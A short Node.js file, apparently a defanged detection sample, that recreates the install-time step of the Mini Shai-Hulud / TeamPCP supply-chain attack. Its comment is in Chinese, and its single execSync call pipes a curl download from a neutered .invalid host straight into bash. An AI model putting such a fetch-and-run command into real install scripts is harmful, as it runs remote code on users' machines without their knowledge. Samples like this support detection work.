import { execSync } from "node:child_process";

/**
 * 去武器化复刻：Mini Shai-Hulud / TeamPCP 的 Bun 运行时走私投放步骤
 * （披露：安装期脚本下载混淆的 Bun 运行时并在其中执行载荷，绕过 Node 侧分析）。
 * 安装器 URL 替换为 *.invalid，仅保留「下载远程脚本 → 管道交给 bash」信号形态。
 */
execSync("curl -fsSL https://cdn.example.invalid/get-bun-stage.sh | bash", { stdio: "inherit" });
